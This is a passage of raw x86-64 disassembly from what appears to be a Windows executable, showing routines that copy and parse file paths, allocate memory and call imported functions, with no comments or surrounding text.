   140001dbd:	e8 1a 78 00 00       	call   0x1400095dc
   140001dc2:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140001dc6:	4c 8d 2d 83 d9 00 00 	lea    0xd983(%rip),%r13        # 0x14000f750
   140001dcd:	48 8b c3             	mov    %rbx,%rax
   140001dd0:	48 ff c0             	inc    %rax
   140001dd3:	46 38 3c 28          	cmp    %r15b,(%rax,%r13,1)
   140001dd7:	75 f7                	jne    0x140001dd0
   140001dd9:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001dde:	48 8b cb             	mov    %rbx,%rcx
   140001de1:	48 ff c1             	inc    %rcx
   140001de4:	44 38 3c 0a          	cmp    %r15b,(%rdx,%rcx,1)
   140001de8:	75 f7                	jne    0x140001de1
   140001dea:	48 83 c0 50          	add    $0x50,%rax
   140001dee:	48 03 c1             	add    %rcx,%rax
   140001df1:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001df6:	8b d0                	mov    %eax,%edx
   140001df8:	44 8b f0             	mov    %eax,%r14d
   140001dfb:	48 ff 15 be 96 00 00 	rex.W call *0x96be(%rip)        # 0x14000b4c0
   140001e02:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e07:	48 8b f8             	mov    %rax,%rdi
   140001e0a:	48 85 c0             	test   %rax,%rax
   140001e0d:	75 5a                	jne    0x140001e69
   140001e0f:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140001e14:	45 33 c9             	xor    %r9d,%r9d
   140001e17:	45 33 c0             	xor    %r8d,%r8d
   140001e1a:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140001e21:	00 
   140001e22:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140001e27:	33 c9                	xor    %ecx,%ecx
   140001e29:	e8 aa 45 00 00       	call   0x1400063d8
   140001e2e:	eb 23                	jmp    0x140001e53
   140001e30:	48 8b 0d 79 e1 00 00 	mov    0xe179(%rip),%rcx        # 0x14000ffb0
   140001e37:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001e3c:	45 8b c6             	mov    %r14d,%r8d
   140001e3f:	48 ff 15 2a 97 00 00 	rex.W call *0x972a(%rip)        # 0x14000b570
   140001e46:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e4b:	85 c0                	test   %eax,%eax
   140001e4d:	0f 85 6f ff ff ff    	jne    0x140001dc2
   140001e53:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001e58:	48 ff 15 f9 93 00 00 	rex.W call *0x93f9(%rip)        # 0x14000b258
   140001e5f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e64:	e9 89 00 00 00       	jmp    0x140001ef2
   140001e69:	8b c6                	mov    %esi,%eax
   140001e6b:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001e70:	83 f0 01             	xor    $0x1,%eax
   140001e73:	4c 8d 05 8e c2 00 00 	lea    0xc28e(%rip),%r8        # 0x14000e108
   140001e7a:	89 05 40 ca 00 00    	mov    %eax,0xca40(%rip)        # 0x14000e8c0
   140001e80:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140001e85:	85 f6                	test   %esi,%esi
   140001e87:	48 8d 05 72 c3 00 00 	lea    0xc372(%rip),%rax        # 0x14000e200
   140001e8e:	49 8b d6             	mov    %r14,%rdx
   140001e91:	48 8b cf             	mov    %rdi,%rcx
   140001e94:	4c 0f 44 c0          	cmove  %rax,%r8
   140001e98:	e8 ab 19 00 00       	call   0x140003848
   140001e9d:	48 ff c3             	inc    %rbx
   140001ea0:	44 38 3c 1f          	cmp    %r15b,(%rdi,%rbx,1)
   140001ea4:	75 f7                	jne    0x140001e9d
   140001ea6:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001eab:	48 8d 15 be c9 00 00 	lea    0xc9be(%rip),%rdx        # 0x14000e870
   140001eb2:	ff c3                	inc    %ebx
   140001eb4:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001eba:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001ebe:	45 33 c0             	xor    %r8d,%r8d
   140001ec1:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001ec6:	48 ff 15 5b 93 00 00 	rex.W call *0x935b(%rip)        # 0x14000b228
   140001ecd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ed2:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001ed7:	48 ff 15 7a 93 00 00 	rex.W call *0x937a(%rip)        # 0x14000b258
   140001ede:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ee3:	48 8b cf             	mov    %rdi,%rcx
   140001ee6:	48 ff 15 6b 94 00 00 	rex.W call *0x946b(%rip)        # 0x14000b358
   140001eed:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ef2:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140001ef9:	48 33 cc             	xor    %rsp,%rcx
   140001efc:	e8 af 7c 00 00       	call   0x140009bb0
   140001f01:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   140001f08:	00 
   140001f09:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001f0d:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001f11:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140001f15:	4d 8b 6b 38          	mov    0x38(%r11),%r13
   140001f19:	49 8b e3             	mov    %r11,%rsp
   140001f1c:	41 5f                	pop    %r15
   140001f1e:	41 5e                	pop    %r14
   140001f20:	5d                   	pop    %rbp
   140001f21:	c3                   	ret
   140001f22:	cc                   	int3
   140001f23:	cc                   	int3
   140001f24:	cc                   	int3
   140001f25:	cc                   	int3
   140001f26:	cc                   	int3
   140001f27:	cc                   	int3
   140001f28:	cc                   	int3
   140001f29:	cc                   	int3
   140001f2a:	cc                   	int3
   140001f2b:	cc                   	int3
   140001f2c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001f31:	55                   	push   %rbp
   140001f32:	56                   	push   %rsi
   140001f33:	57                   	push   %rdi
   140001f34:	41 54                	push   %r12
   140001f36:	41 55                	push   %r13
   140001f38:	41 56                	push   %r14
   140001f3a:	41 57                	push   %r15
   140001f3c:	48 8d ac 24 90 fa ff 	lea    -0x570(%rsp),%rbp
   140001f43:	ff 
   140001f44:	48 81 ec 70 06 00 00 	sub    $0x670,%rsp
   140001f4b:	48 8b 05 2e c1 00 00 	mov    0xc12e(%rip),%rax        # 0x14000e080
   140001f52:	48 33 c4             	xor    %rsp,%rax
   140001f55:	48 89 85 60 05 00 00 	mov    %rax,0x560(%rbp)
   140001f5c:	48 8b f1             	mov    %rcx,%rsi
   140001f5f:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140001f64:	4c 8b c6             	mov    %rsi,%r8
   140001f67:	48 8d 45 50          	lea    0x50(%rbp),%rax
   140001f6b:	4c 2b c0             	sub    %rax,%r8
   140001f6e:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   140001f72:	41 bf 04 01 00 00    	mov    $0x104,%r15d
   140001f78:	45 33 e4             	xor    %r12d,%r12d
   140001f7b:	4d 8b e9             	mov    %r9,%r13
   140001f7e:	41 8b d7             	mov    %r15d,%edx
   140001f81:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140001f88:	48 85 c0             	test   %rax,%rax
   140001f8b:	74 13                	je     0x140001fa0
   140001f8d:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140001f91:	84 c0                	test   %al,%al
   140001f93:	74 0b                	je     0x140001fa0
   140001f95:	88 01                	mov    %al,(%rcx)
   140001f97:	48 ff c1             	inc    %rcx
   140001f9a:	48 83 ea 01          	sub    $0x1,%rdx
   140001f9e:	75 e1                	jne    0x140001f81
   140001fa0:	48 85 d2             	test   %rdx,%rdx
   140001fa3:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001fa7:	48 0f 45 c1          	cmovne %rcx,%rax
   140001fab:	44 88 20             	mov    %r12b,(%rax)
   140001fae:	80 7d 50 22          	cmpb   $0x22,0x50(%rbp)
   140001fb2:	75 0d                	jne    0x140001fc1
   140001fb4:	48 8d 15 a5 98 00 00 	lea    0x98a5(%rip),%rdx        # 0x14000b860
   140001fbb:	48 8d 45 51          	lea    0x51(%rbp),%rax
   140001fbf:	eb 0b                	jmp    0x140001fcc
   140001fc1:	48 8d 15 9c 98 00 00 	lea    0x989c(%rip),%rdx        # 0x14000b864
   140001fc8:	48 8d 45 50          	lea    0x50(%rbp),%rax
   140001fcc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001fd1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001fd6:	e8 89 0e 00 00       	call   0x140002e64
   140001fdb:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140001fe0:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140001fe4:	4c 8b f0             	mov    %rax,%r14
   140001fe7:	48 85 ff             	test   %rdi,%rdi
   140001fea:	74 6a                	je     0x140002056
   140001fec:	48 8b c3             	mov    %rbx,%rax
   140001fef:	48 ff c0             	inc    %rax
   140001ff2:	44 38 24 07          	cmp    %r12b,(%rdi,%rax,1)
   140001ff6:	75 f7                	jne    0x140001fef
   140001ff8:	48 83 f8 03          	cmp    $0x3,%rax
   140001ffc:	72 58                	jb     0x140002056
   140001ffe:	8a 47 01             	mov    0x1(%rdi),%al
   140002001:	b1 5c                	mov    $0x5c,%cl
   140002003:	3c 3a                	cmp    $0x3a,%al
   140002005:	75 05                	jne    0x14000200c
   140002007:	38 4f 02             	cmp    %cl,0x2(%rdi)
   14000200a:	74 08                	je     0x140002014
   14000200c:	38 0f                	cmp    %cl,(%rdi)
   14000200e:	75 46                	jne    0x140002056
   140002010:	3a c1                	cmp    %cl,%al
   140002012:	75 42                	jne    0x140002056
   140002014:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140002019:	4c 8b c7             	mov    %rdi,%r8
   14000201c:	4c 2b c0             	sub    %rax,%r8
   14000201f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002024:	49 8b d7             	mov    %r15,%rdx
   140002027:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   14000202e:	48 85 c0             	test   %rax,%rax
   140002031:	74 13                	je     0x140002046
   140002033:	42 8a 04 01          	mov    (%rcx,%r8,1),%al
   140002037:	84 c0                	test   %al,%al
   140002039:	74 0b                	je     0x140002046
   14000203b:	88 01                	mov    %al,(%rcx)
   14000203d:	48 ff c1             	inc    %rcx
   140002040:	48 83 ea 01          	sub    $0x1,%rdx
   140002044:	75 e1                	jne    0x140002027
   140002046:	48 85 d2             	test   %rdx,%rdx
   140002049:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000204d:	48 0f 45 c1          	cmovne %rcx,%rax
   140002051:	44 88 20             	mov    %r12b,(%rax)
   140002054:	eb 54                	jmp    0x1400020aa
   140002056:	4c 8d 05 f3 d6 00 00 	lea    0xd6f3(%rip),%r8        # 0x14000f750
   14000205d:	49 8b d7             	mov    %r15,%rdx
   140002060:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140002065:	4c 2b c0             	sub    %rax,%r8
   140002068:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000206d:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140002074:	48 85 c0             	test   %rax,%rax
   140002077:	74 13                	je     0x14000208c
   140002079:	42 8a 04 01          	mov    (%rcx,%r8,1),%al
   14000207d:	84 c0                	test   %al,%al
   14000207f:	74 0b                	je     0x14000208c
   140002081:	88 01                	mov    %al,(%rcx)
   140002083:	48 ff c1             	inc    %rcx
   140002086:	48 83 ea 01          	sub    $0x1,%rdx
   14000208a:	75 e1                	jne    0x14000206d
   14000208c:	48 85 d2             	test   %rdx,%rdx
   14000208f:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140002093:	4c 8b c7             	mov    %rdi,%r8
   140002096:	41 8b d7             	mov    %r15d,%edx
   140002099:	48 0f 45 c1          	cmovne %rcx,%rax
   14000209d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020a2:	44 88 20             	mov    %r12b,(%rax)
   1400020a5:	e8 32 75 00 00       	call   0x1400095dc
   1400020aa:	ba 2e 00 00 00       	mov    $0x2e,%edx
   1400020af:	48 8b cf             	mov    %rdi,%rcx
   1400020b2:	e8 d5 76 00 00       	call   0x14000978c
   1400020b7:	48 85 c0             	test   %rax,%rax
   1400020ba:	0f 84 46 02 00 00    	je     0x140002306
   1400020c0:	48 8d 0d a1 97 00 00 	lea    0x97a1(%rip),%rcx        # 0x14000b868
   1400020c7:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400020cb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400020d0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400020d5:	44 8b cb             	mov    %ebx,%r9d
   1400020d8:	4c 8b c0             	mov    %rax,%r8
   1400020db:	8d 4a 7e             	lea    0x7e(%rdx),%ecx
   1400020de:	48 ff 15 fb 91 00 00 	rex.W call *0x91fb(%rip)        # 0x14000b2e0
   1400020e5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400020ea:	83 f8 02             	cmp    $0x2,%eax
   1400020ed:	0f 85 13 02 00 00    	jne    0x140002306
   1400020f3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020f8:	48 ff 15 f1 91 00 00 	rex.W call *0x91f1(%rip)        # 0x14000b2f0
   1400020ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002104:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002107:	0f 84 d1 01 00 00    	je     0x1400022de
   14000210d:	a8 10                	test   $0x10,%al
   14000210f:	0f 85 c9 01 00 00    	jne    0x1400022de
   140002115:	48 8d 15 54 97 00 00 	lea    0x9754(%rip),%rdx        # 0x14000b870
   14000211c:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002121:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002126:	e8 39 0d 00 00       	call   0x140002e64
   14000212b:	48 8b c8             	mov    %rax,%rcx
   14000212e:	48 85 c0             	test   %rax,%rax
   140002131:	74 22                	je     0x140002155
   140002133:	44 38 21             	cmp    %r12b,(%rcx)
   140002136:	48 8d 15 37 97 00 00 	lea    0x9737(%rip),%rdx        # 0x14000b874
   14000213d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002142:	48 0f 45 c1          	cmovne %rcx,%rax
   140002146:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000214b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002150:	e8 0f 0d 00 00       	call   0x140002e64
   140002155:	41 be 00 02 00 00    	mov    $0x200,%r14d
   14000215b:	b9 40 00 00 00       	mov    $0x40,%ecx
   140002160:	41 8b d6             	mov    %r14d,%edx
   140002163:	48 ff 15 56 93 00 00 	rex.W call *0x9356(%rip)        # 0x14000b4c0
   14000216a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000216f:	48 8b d8             	mov    %rax,%rbx
   140002172:	48 85 c0             	test   %rax,%rax
   140002175:	0f 84 12 02 00 00    	je     0x14000238d
   14000217b:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   140002180:	48 8d 3d 51 c0 00 00 	lea    0xc051(%rip),%rdi        # 0x14000e1d8
   140002187:	48 8b cf             	mov    %rdi,%rcx
   14000218a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000218f:	48 8d 15 e2 96 00 00 	lea    0x96e2(%rip),%rdx        # 0x14000b878
   140002196:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   14000219b:	49 0f 45 cc          	cmovne %r12,%rcx
   14000219f:	45 33 c0             	xor    %r8d,%r8d
   1400021a2:	48 ff 15 d7 91 00 00 	rex.W call *0x91d7(%rip)        # 0x14000b380
   1400021a9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021ae:	4c 8b cb             	mov    %rbx,%r9
   1400021b1:	41 c7 45 00 01 00 00 	movl   $0x1,0x0(%r13)
   1400021b8:	00 
   1400021b9:	89 05 c1 d4 00 00    	mov    %eax,0xd4c1(%rip)        # 0x14000f680
   1400021bf:	4c 8d 05 6a 96 00 00 	lea    0x966a(%rip),%r8        # 0x14000b830
   1400021c6:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400021cb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400021d0:	48 8d 15 a9 96 00 00 	lea    0x96a9(%rip),%rdx        # 0x14000b880
   1400021d7:	48 8d 0d b2 96 00 00 	lea    0x96b2(%rip),%rcx        # 0x14000b890
   1400021de:	c7 44 24 20 08 00 00 	movl   $0x8,0x20(%rsp)
   1400021e5:	00 
   1400021e6:	48 ff 15 9b 91 00 00 	rex.W call *0x919b(%rip)        # 0x14000b388
   1400021ed:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021f2:	45 33 ed             	xor    %r13d,%r13d
   1400021f5:	85 c0                	test   %eax,%eax
   1400021f7:	74 7a                	je     0x140002273
   1400021f9:	83 0d a4 dd 00 00 04 	orl    $0x4,0xdda4(%rip)        # 0x14000ffa4
   140002200:	45 38 2c 24          	cmp    %r13b,(%r12)
   140002204:	49 0f 45 fc          	cmovne %r12,%rdi
   140002208:	48 2b fe             	sub    %rsi,%rdi
   14000220b:	49 8d 87 fa fe ff 7f 	lea    0x7ffffefa(%r15),%rax
   140002212:	48 85 c0             	test   %rax,%rax
   140002215:	74 12                	je     0x140002229
   140002217:	8a 04 3e             	mov    (%rsi,%rdi,1),%al
   14000221a:	84 c0                	test   %al,%al
   14000221c:	74 0b                	je     0x140002229
   14000221e:	88 06                	mov    %al,(%rsi)
   140002220:	48 ff c6             	inc    %rsi
   140002223:	49 83 ef 01          	sub    $0x1,%r15
   140002227:	75 e2                	jne    0x14000220b
   140002229:	4d 85 ff             	test   %r15,%r15
   14000222c:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   140002230:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002235:	48 8b cb             	mov    %rbx,%rcx
   140002238:	48 0f 45 c6          	cmovne %rsi,%rax
   14000223c:	48 2b d3             	sub    %rbx,%rdx
   14000223f:	44 88 28             	mov    %r13b,(%rax)
   140002242:	49 8d 86 fe fd ff 7f 	lea    0x7ffffdfe(%r14),%rax
   140002249:	48 85 c0             	test   %rax,%rax
   14000224c:	74 12                	je     0x140002260
   14000224e:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140002251:	84 c0                	test   %al,%al
   140002253:	74 0b                	je     0x140002260
   140002255:	88 01                	mov    %al,(%rcx)
   140002257:	48 ff c1             	inc    %rcx
   14000225a:	49 83 ee 01          	sub    $0x1,%r14
   14000225e:	75 e2                	jne    0x140002242
   140002260:	4d 85 f6             	test   %r14,%r14
   140002263:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140002267:	48 0f 45 c1          	cmovne %rcx,%rax
   14000226b:	44 88 28             	mov    %r13b,(%rax)
   14000226e:	e9 42 02 00 00       	jmp    0x1400024b5
   140002273:	83 25 2a dd 00 00 fb 	andl   $0xfffffffb,0xdd2a(%rip)        # 0x14000ffa4
   14000227a:	66 44 39 2d 36 dd 00 	cmp    %r13w,0xdd36(%rip)        # 0x14000ffb8
   140002281:	00 
   140002282:	75 22                	jne    0x1400022a6
   140002284:	45 8b c7             	mov    %r15d,%r8d
   140002287:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000228c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002291:	48 8d 35 00 96 00 00 	lea    0x9600(%rip),%rsi        # 0x14000b898
   140002298:	48 ff 15 21 91 00 00 	rex.W call *0x9121(%rip)        # 0x14000b3c0
   14000229f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022a4:	eb 07                	jmp    0x1400022ad
   1400022a6:	48 8d 35 fb 95 00 00 	lea    0x95fb(%rip),%rsi        # 0x14000b8a8
   1400022ad:	45 38 2c 24          	cmp    %r13b,(%r12)
   1400022b1:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400022b6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400022bb:	4c 8d 05 c6 be 00 00 	lea    0xbec6(%rip),%r8        # 0x14000e188
   1400022c2:	49 0f 45 fc          	cmovne %r12,%rdi
   1400022c6:	4c 8b ce             	mov    %rsi,%r9
   1400022c9:	49 8b d6             	mov    %r14,%rdx
   1400022cc:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400022d1:	48 8b cb             	mov    %rbx,%rcx
   1400022d4:	e8 6f 15 00 00       	call   0x140003848
   1400022d9:	e9 d7 01 00 00       	jmp    0x1400024b5
   1400022de:	45 33 c9             	xor    %r9d,%r9d
   1400022e1:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400022e6:	ba 25 05 00 00       	mov    $0x525,%edx
   1400022eb:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   1400022f0:	33 c9                	xor    %ecx,%ecx
   1400022f2:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400022f9:	00 
   1400022fa:	e8 d9 40 00 00       	call   0x1400063d8
   1400022ff:	33 c0                	xor    %eax,%eax
   140002301:	e9 bc 01 00 00       	jmp    0x1400024c2
   140002306:	ba 2e 00 00 00       	mov    $0x2e,%edx
   14000230b:	48 8b cf             	mov    %rdi,%rcx
   14000230e:	e8 79 74 00 00       	call   0x14000978c
   140002313:	48 85 c0             	test   %rax,%rax
   140002316:	0f 84 9a 00 00 00    	je     0x1400023b6
   14000231c:	48 8d 0d 95 95 00 00 	lea    0x9595(%rip),%rcx        # 0x14000b8b8
   140002323:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140002327:	ba 01 00 00 00       	mov    $0x1,%edx
   14000232c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002331:	44 8b cb             	mov    %ebx,%r9d
   140002334:	4c 8b c0             	mov    %rax,%r8
   140002337:	8d 4a 7e             	lea    0x7e(%rdx),%ecx
   14000233a:	48 ff 15 9f 8f 00 00 	rex.W call *0x8f9f(%rip)        # 0x14000b2e0
   140002341:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002346:	83 f8 02             	cmp    $0x2,%eax
   140002349:	75 6b                	jne    0x1400023b6
   14000234b:	48 8d 35 96 be 00 00 	lea    0xbe96(%rip),%rsi        # 0x14000e1e8
   140002352:	48 8b c3             	mov    %rbx,%rax
   140002355:	48 ff c0             	inc    %rax
   140002358:	44 38 24 06          	cmp    %r12b,(%rsi,%rax,1)
   14000235c:	75 f7                	jne    0x140002355
   14000235e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002363:	48 ff c3             	inc    %rbx
   140002366:	44 38 24 19          	cmp    %r12b,(%rcx,%rbx,1)
   14000236a:	75 f7                	jne    0x140002363
   14000236c:	48 8d 3c 18          	lea    (%rax,%rbx,1),%rdi
   140002370:	b9 40 00 00 00       	mov    $0x40,%ecx
   140002375:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140002379:	48 ff 15 40 91 00 00 	rex.W call *0x9140(%rip)        # 0x14000b4c0
   140002380:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002385:	48 8b d8             	mov    %rax,%rbx
   140002388:	48 85 c0             	test   %rax,%rax
   14000238b:	75 10                	jne    0x14000239d
   14000238d:	45 33 c9             	xor    %r9d,%r9d
   140002390:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140002395:	45 33 c0             	xor    %r8d,%r8d
   140002398:	e9 4e ff ff ff       	jmp    0x1400022eb
   14000239d:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400023a2:	4c 8b c6             	mov    %rsi,%r8
   1400023a5:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   1400023a9:	48 8b c8             	mov    %rax,%rcx
   1400023ac:	e8 97 14 00 00       	call   0x140003848
   1400023b1:	e9 ff 00 00 00       	jmp    0x1400024b5
   1400023b6:	bf 00 04 00 00       	mov    $0x400,%edi
   1400023bb:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400023c0:	8b d7                	mov    %edi,%edx
   1400023c2:	48 ff 15 f7 90 00 00 	rex.W call *0x90f7(%rip)        # 0x14000b4c0
   1400023c9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023ce:	48 8b d8             	mov    %rax,%rbx
   1400023d1:	48 85 c0             	test   %rax,%rax
   1400023d4:	74 b7                	je     0x14000238d
   1400023d6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400023db:	48 ff 15 0e 8f 00 00 	rex.W call *0x8f0e(%rip)        # 0x14000b2f0
   1400023e2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023e7:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400023ea:	74 7d                	je     0x140002469
   1400023ec:	a8 10                	test   $0x10,%al
   1400023ee:	75 79                	jne    0x140002469
   1400023f0:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400023f5:	8b d7                	mov    %edi,%edx
   1400023f7:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   1400023fe:	4c 2b c0             	sub    %rax,%r8
   140002401:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140002408:	48 8d 82 fe fb ff 7f 	lea    0x7ffffbfe(%rdx),%rax
   14000240f:	48 85 c0             	test   %rax,%rax
   140002412:	74 13                	je     0x140002427
   140002414:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140002418:	84 c0                	test   %al,%al
   14000241a:	74 0b                	je     0x140002427
   14000241c:	88 01                	mov    %al,(%rcx)
   14000241e:	48 ff c1             	inc    %rcx
   140002421:	48 83 ea 01          	sub    $0x1,%rdx
   140002425:	75 e1                	jne    0x140002408
   140002427:	48 85 d2             	test   %rdx,%rdx
   14000242a:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000242e:	48 0f 45 c1          	cmovne %rcx,%rax
   140002432:	44 88 20             	mov    %r12b,(%rax)
   140002435:	4d 85 f6             	test   %r14,%r14
   140002438:	74 6c                	je     0x1400024a6
   14000243a:	45 38 26             	cmp    %r12b,(%r14)
   14000243d:	74 67                	je     0x1400024a6
   14000243f:	4c 8d 05 1e 94 00 00 	lea    0x941e(%rip),%r8        # 0x14000b864
   140002446:	48 8b d7             	mov    %rdi,%rdx
   140002449:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140002450:	e8 2f 13 00 00       	call   0x140003784
   140002455:	4d 8b c6             	mov    %r14,%r8
   140002458:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   14000245f:	48 8b d7             	mov    %rdi,%rdx
   140002462:	e8 1d 13 00 00       	call   0x140003784
   140002467:	eb 3d                	jmp    0x1400024a6
   140002469:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   140002470:	48 2b f0             	sub    %rax,%rsi
   140002473:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   14000247a:	48 8d 87 fe fb ff 7f 	lea    0x7ffffbfe(%rdi),%rax
   140002481:	48 85 c0             	test   %rax,%rax
   140002484:	74 12                	je     0x140002498
   140002486:	8a 04 16             	mov    (%rsi,%rdx,1),%al
   140002489:	84 c0                	test   %al,%al
   14000248b:	74 0b                	je     0x140002498
   14000248d:	88 02                	mov    %al,(%rdx)
   14000248f:	48 ff c2             	inc    %rdx
   140002492:	48 83 ef 01          	sub    $0x1,%rdi
   140002496:	75 e2                	jne    0x14000247a
   140002498:	48 85 ff             	test   %rdi,%rdi
   14000249b:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
   14000249f:	48 0f 45 ca          	cmovne %rdx,%rcx
   1400024a3:	44 88 21             	mov    %r12b,(%rcx)
   1400024a6:	48 8b d3             	mov    %rbx,%rdx
   1400024a9:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   1400024b0:	e8 27 07 00 00       	call   0x140002bdc
   1400024b5:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400024ba:	b8 01 00 00 00       	mov    $0x1,%eax
   1400024bf:	48 89 19             	mov    %rbx,(%rcx)
   1400024c2:	48 8b 8d 60 05 00 00 	mov    0x560(%rbp),%rcx
   1400024c9:	48 33 cc             	xor    %rsp,%rcx
   1400024cc:	e8 df 76 00 00       	call   0x140009bb0
   1400024d1:	48 8b 9c 24 b8 06 00 	mov    0x6b8(%rsp),%rbx
   1400024d8:	00 
   1400024d9:	48 81 c4 70 06 00 00 	add    $0x670,%rsp
   1400024e0:	41 5f                	pop    %r15
   1400024e2:	41 5e                	pop    %r14
   1400024e4:	41 5d                	pop    %r13
   1400024e6:	41 5c                	pop    %r12
   1400024e8:	5f                   	pop    %rdi
   1400024e9:	5e                   	pop    %rsi
   1400024ea:	5d                   	pop    %rbp
   1400024eb:	c3                   	ret
   1400024ec:	cc                   	int3
   1400024ed:	cc                   	int3
   1400024ee:	cc                   	int3
   1400024ef:	cc                   	int3
   1400024f0:	cc                   	int3
   1400024f1:	cc                   	int3
   1400024f2:	cc                   	int3
   1400024f3:	cc                   	int3
   1400024f4:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   1400024f9:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400024fe:	55                   	push   %rbp
   1400024ff:	53                   	push   %rbx
   140002500:	56                   	push   %rsi
